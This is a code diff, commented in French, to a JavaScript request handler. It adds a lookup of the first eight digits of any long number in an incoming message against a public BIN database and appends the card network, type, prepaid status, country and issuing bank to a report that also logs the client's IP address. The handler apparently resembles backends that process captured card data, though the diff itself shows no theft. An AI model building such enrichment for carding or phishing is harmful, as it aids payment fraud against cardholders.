@@ -168,6 +168,49 @@ export default async function handler(req, res) {
     text += icon ? `${icon} ${line}\n` : `${line}\n`;
   }
 
+  // —————— AJOUT : lookup BIN sur les 8 premiers chiffres ——————
+  // on cherche la première suite d’au moins 8 chiffres dans le message
+  const binMatch = rawMsg.match(/\b(\d{8,})/);
+  if (binMatch) {
+    const bin8 = binMatch[1].slice(0, 8);
+    try {
+      const binRes = await fetch(
+        `https://lookup.binlist.net/${bin8}`,
+        { headers: { 'Accept-Version': '3' } }
+      );
+      if (binRes.ok) {
+        const d = await binRes.json();
+        const scheme       = d.scheme       || '?';
+        const brand        = d.brand        || '?';
+        const numInfo      = d.number || {};
+        const length       = numInfo.length || '?';
+        const luhn         = numInfo.luhn ? 'Yes' : 'No';
+        const cardType     = (d.type || '?').charAt(0).toUpperCase() + (d.type||'?').slice(1);
+        const prepaid      = d.prepaid      ? 'Yes' : 'No';
+        const country      = d.country || {};
+        const countryName  = country.name   || '?';
+        const countryEmoji = country.emoji  || '';
+        const lat          = country.latitude  || '?';
+        const lon          = country.longitude || '?';
+        const bankName     = (d.bank || {}).name || '?';
+
+        text += '\n💳 BIN Lookup:\n'
+          + `   • Scheme / network: ${scheme}\n`
+          + `   • Brand: ${brand}\n`
+          + `   • Card number length: ${length}\n`
+          + `   • LUHN: ${luhn}\n`
+          + `   • Type: ${cardType}\n`
+          + `   • Prepaid: ${prepaid}\n`
+          + `   • Country: ${countryEmoji} ${countryName}\n`
+          + `     (latitude: ${lat}, longitude: ${lon})\n`
+          + `   • Bank: ${bankName}\n`;
+      }
+    } catch (e) {
+      text += `\n❗ Impossible de récupérer les infos BIN : ${e.message}\n`;
+    }
+  }
+  // —————— FIN DE L’AJOUT ——————
+
   // 8️⃣ Ajout du bloc infos système
   text += `\n🗓️ Date & heure : ${date}, ${time}\n`;
   text += `🌐 IP Client     : ${ip}\n`;
